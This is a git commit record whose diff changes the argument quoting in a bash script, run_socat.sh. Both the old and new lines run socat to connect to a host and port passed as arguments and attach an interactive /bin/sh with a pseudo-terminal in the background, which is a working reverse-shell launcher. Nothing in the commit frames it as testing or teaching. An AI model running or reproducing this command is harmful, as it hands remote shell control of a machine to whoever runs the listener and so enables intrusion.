487d071665d2dec5cc61b4b9959bee1eedfff63c
ly-temp <100673133+ly-temp@users.noreply.github.com>
2022-08-20 18:39:06 +0800

    Update run_socat.sh

--- bash/run_socat.sh
+++ bash/run_socat.sh
@@ -1,3 +1,3 @@
 #/bin/bash
 #$host $port
-env TERM=linux ./socat "$1:$2" exec:/bin/sh,pty,stderr,setsid,sigint,sane >../log.txt 2>&1 &
+env TERM=linux ./socat "$1":"$2" exec:/bin/sh,pty,stderr,setsid,sigint,sane >../log.txt 2>&1 &
